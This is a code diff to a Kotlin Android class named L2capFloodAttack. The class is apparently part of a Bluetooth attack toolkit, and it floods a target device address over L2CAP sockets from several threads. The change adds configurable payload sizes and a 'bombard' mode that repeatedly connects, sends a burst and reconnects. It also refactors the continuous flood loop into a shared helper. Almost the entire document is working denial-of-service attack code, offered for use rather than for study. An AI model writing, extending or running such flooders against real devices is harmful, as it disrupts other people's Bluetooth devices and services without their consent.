@@ -27,7 +27,9 @@ class L2capFloodAttack(
     private val targetAddress: String,
     private val threads: Int = 8,
     private val rateDelayMs: Int = 0,
-    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED
+    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
+    private val payloadSize: Int = 0,
+    private val bombard: Boolean = false
 ) : BluetoothAttack {
 
     override val displayName = AttackType.L2CAP_FLOOD.displayName
@@ -68,10 +70,20 @@ class L2capFloodAttack(
                         socket.connect()
                         if (socket.isConnected) {
                             successfulUUID = uuid
-                            sockets.add(socket)
-                            onLog("[$worker][CONN] Conexión establecida (UUID $uuid)")
-                            floodSocket(socket, onLog, worker)
-                            break
+                            if (bombard) {
+                                // Bombard: one burst then close, cycle fast
+                                val size = if (payloadSize > 0) payloadSize else 600
+                                socket.outputStream.write(payloadPattern.buffer(size))
+                                onLog("[$worker][DATA] Ráfaga enviada (bombardeo)")
+                                runCatching { socket.close() }
+                                jitterDelay(maxOf(50, rateDelayMs))
+                            } else {
+                                sockets.add(socket)
+                                onLog("[$worker][CONN] Conexión establecida (UUID $uuid)")
+                                FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
+                                sockets.remove(socket)
+                                break
+                            }
                         }
                     } catch (err: IOException) {
                         runCatching { socket?.close() }
@@ -87,23 +99,7 @@ class L2capFloodAttack(
     }
 
     private suspend fun floodSocket(socket: BluetoothSocket, onLog: (String) -> Unit, worker: Int) {
-        val raw = socket.maxTransmitPacketSize
-        val dataSize = if (raw > 0) raw else 600
-        val sendBuffer = payloadPattern.buffer(dataSize)
-        try {
-            var blocks = 0
-            while (running && socket.isConnected) {
-                socket.outputStream.write(sendBuffer)
-                blocks++
-                jitterDelay(rateDelayMs)
-                if (blocks % 200 == 0) onLog("[$worker][DATA] Enviados $blocks bloques")
-            }
-        } catch (e: IOException) {
-            // connection dropped by the remote side — expected under flood
-        } finally {
-            runCatching { socket.close() }
-            sockets.remove(socket)
-        }
+        FloodSupport.flood(socket, payloadPattern, payloadSize, rateDelayMs, { running }, onLog, "$worker")
     }
 
     override fun stop() {
